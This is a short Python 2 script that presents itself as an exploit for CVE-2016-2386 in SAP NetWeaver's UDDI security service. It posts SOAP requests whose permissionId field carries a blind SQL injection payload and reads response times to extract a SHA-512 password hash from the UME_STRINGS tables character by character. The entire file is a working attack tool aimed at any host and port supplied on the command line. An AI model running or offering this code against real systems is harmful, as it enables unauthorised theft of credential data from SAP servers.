#! /usr/bin/env python2
#  -*- coding: utf-8 -*-
#  author:boo

import argparse
import requests
import string

_magic = "{SHA-512, 10000, 24}"
_wrong_magic = "{SHA-511, 10000, 24}"
_xml = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" " \
       "xmlns:sec=\"http://sap.com/esi/uddi/ejb/security/\">\r\n  <soapenv:Header/>\r\n  <soapenv:Body>\r\n    " \
       "<sec:deletePermissionById>\r\n      <permissionId>1' AND 1=(select COUNT(*) from UME_STRINGS_PERM, " \
       "UME_STRINGS where UME_STRINGS.PID like '%PRIVATE_DATASOURCE.un:123%' and UME_STRINGS.VAL like '%{" \
       "0}%') AND '1'='1</permissionId>\r\n    </sec:deletePermissionById>\r\n  </soapenv:Body>\r\n</soapenv:Envelope> "
host = ""
port = 0
_dictionary = string.digits + string.uppercase + string.lowercase

def _get_timeout(_data):
    return requests.post("http://{0}:{1}/UDDISecurityService/UDDISecurityImplBean".format(host, port),
                         headers={
                             "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 "
                                           "Firefox/57.0",
                             "SOAPAction": "",
                             "Content-Type": "text/xml;charset=UTF-8"
                         },
                         data=_xml.format(_data)).elapsed.total_seconds()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--host')
    parser.add_argument('--port')
    parser.add_argument('-v')

    args = parser.parse_args()
    args_dict = vars(args)

    host = args_dict['host']
    port = args_dict['port']

    print "start to retrieve data from the table UMS_STRINGS from {0} server using CVE-2016-2386 exploit ".format(host)
    _hash = _magic
    print "this may take a few minutes"
    for i in range(24):  # you can change it if like to get full hash
        for _char in _dictionary:
            if not (args_dict['v'] is None):
                print "checking {0}".format(_hash + _char)
            if _get_timeout(_hash + _char) > 1.300:  # timeout for local SAP server
                _hash += _char
                print "Found " + _hash
                break
            